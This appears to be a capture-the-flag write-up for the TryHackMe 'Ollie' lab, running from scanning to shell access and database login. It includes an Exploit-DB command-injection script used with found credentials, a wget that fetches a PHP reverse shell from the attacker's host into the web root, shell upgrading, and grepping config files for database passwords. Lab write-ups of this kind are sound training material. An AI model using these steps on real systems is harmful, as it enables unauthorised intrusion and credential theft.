# Ollie

**Room Link:** [https://tryhackme.com/room/ollie](https://tryhackme.com/room/ollie)

## Initial Scan

**Kali**

<pre><code><strong>nmap -A $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>



## Scan all ports

**Kali**

<pre><code><strong>nmap -sV -sT -O -p 1-65535 $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>





## TCP/80 - HTTP

**Kali**

```
gobuster dir -u $VICTIM -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>



## TCP/1337 - waste

**Kali**

```
nc -v $VICTIM 1337
```



<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>





## TCP/80 - HTTP

**Browser**

```
Username: admin
Password: OllieUnixMontgomery!
```



<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>



## Initial Shell

**Exploit:** [https://www.exploit-db.com/raw/50963](https://www.exploit-db.com/raw/50963)



**Kali**

```
python3 exploit.py  -usr admin -pwd OllieUnixMontgomery! -cmd 'whoami' -url http://10.10.109.76
```

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>



We can run commands from the browser as well.

<figure><img src="../../.gitbook/assets/image (633).png" alt=""><figcaption></figcaption></figure>

Got this php reverse shell, just changed the IP

**Kali**

```
git clone https://github.com/pentestmonkey/php-reverse-shell
cd php-reverse-shell
subl php-reverse-shell.php 
python2 -m SimpleHTTPServer 81
```

**Kali**

```
nc -lvnp 1234
```

We have access to write to the immaolllieeboyyy directory so we put our shell there.

**Browser**

```
wget http://10.10.217.212:81/php-reverse-shell.php -O immaolllieeboyyy/test.php
```

**Browser**

```
/immaolllieeboyyy/test.php
```

<figure><img src="../../.gitbook/assets/image (635).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (636).png" alt=""><figcaption></figcaption></figure>



Get autocomplete

```
python -c 'import pty; pty.spawn("/bin/bash")'
ctrl + Z
stty raw -echo;fg
```

**Victim**

```
cd /var/www/html
grep -ir "pass" config.php -A4 -B4
```

<figure><img src="../../.gitbook/assets/image (637).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
mysql -uphpipam_ollie -pIamDah1337estHackerDog!

```





